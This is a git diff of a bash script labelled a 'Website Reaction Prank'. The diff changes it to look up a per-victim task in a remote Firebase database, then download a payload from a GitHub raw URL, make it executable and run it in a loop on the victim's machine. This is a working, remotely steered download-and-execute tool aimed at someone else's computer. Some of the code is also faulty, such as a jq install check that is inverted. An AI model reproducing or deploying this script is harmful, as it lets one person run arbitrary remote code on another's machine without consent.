@@ -9,6 +9,8 @@ if [ -z "$victim" ]; then
 fi
 
 victim="`echo $victim | tr '.#[]/$' '______'`"
+firebaseProject="prankproject-cb680"
+payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"
 
 ###################################################################
  # Configuration variables
@@ -18,6 +20,8 @@ localTaskData="$SCRIPTDIR/taskdata"
 localPayloadFile="$SCRIPTDIR/payload"
 localPayloadETagFile="$SCRIPTDIR/payload.etag"
 localPayloadURLFile="$SCRIPTDIR/payload.url"
+
+jq="$SCRIPTDIR/jq"
 
 ###################################################################
 
@@ -30,6 +34,24 @@ touch "$localPayloadURLFile"
 
 ###################################################################
 
+function installJQ() {
+  if [ -e "$jq" ]; then
+    curl -L -s "https://github.com/stedolan/jq/releases/download/jq-1.5/jq-osx-amd64" > "$jq"
+    chmod +x "$jq"
+  fi
+}
+
+###################################################################
+
+function urlExists(){
+  local url="$1"
+  if [ ! -z "`curl -s -I "$1" 2>&1 | head -n1 | grep '\(404\|400\)'`" ]; then
+    echo 1
+  else
+    echo 0
+  fi
+}
+
 function getURLETag(){
   #echo "getURLETag: $1" >&2
   local remoteURL="$1"
@@ -40,14 +62,12 @@ function getURLETag(){
 }
 
 function getTaskURL(){
-  #echo "getTaskURL: $1" >&2
+  echo "getTaskURL: $1" >&2
   local victimID="$1"
 
-  cat "$localTaskData" \
-   | grep -v -e '^#' -e'^$' \
-   | grep "^$victimID" \
-   | cut -d\   -f2 \
-   | head -n1
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/task.json" \
+   | tr -d '"'
+
 }
 
 function getPayloadURL(){
@@ -55,14 +75,12 @@ function getPayloadURL(){
   local url="$1"
   local victimID="$2"
   
-  curl -H 'Cache-Control: no-cache' -s "$url" \
-   | tr -d '\015' \
-   > "$localTaskData"
-  local payloadURL=`getTaskURL "$victimiID"`
-  if [ -z "$payloadURL" ]; then
+  local payloadURL=`getTaskURL "$victimID"`
+  echo "getPayloadURL: $payloadURL" >&2
+  if [ "$payloadURL" == "null" ]; then
     payloadURL=`getTaskURL "default"`
   fi
-  echo "https://raw.githubusercontent.com/thiesgehrmann/$payloadURL"
+  echo "${payloadPrefix}${payloadURL}"
 
 }
 
@@ -72,7 +90,7 @@ function downloadURL(){
 
   local outfile="$2"
   echo "downloadURL: Downloading $url"
-  curl -s "$url" > "$outfile"
+  curl -s -L "$url" > "$outfile"
   chmod +x "$outfile"
 }
 
@@ -112,9 +130,11 @@ function runPayload() {
   "$localPayloadFile" "$victim" "$iteration"
 }
 
+
 ###################################################################
 
-if [ "${BASH_SOURCE[0]}" != "${0}" ]; then
+# Only perform the next steps if we are not being sourced
+if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
 
   echo "#################################"
   echo "# Website Reaction Prank         "
@@ -131,13 +151,14 @@ if [ "${BASH_SOURCE[0]}" != "${0}" ]; then
   
     downloadPayloadIfNeeded
   
-    timeNow=`date '+%s'`
-  
-    while [ $((date '+%s' - timeNow)) < 15 ]; do
+    timeStart=`date '+%s'`
+    while [ $((`date '+%s'` - timeStart)) -lt 15 ]; do
       runPayload
+      sleep 1
     done
   
     let iteration=$((iteration+1))
   
   done
+
 fi
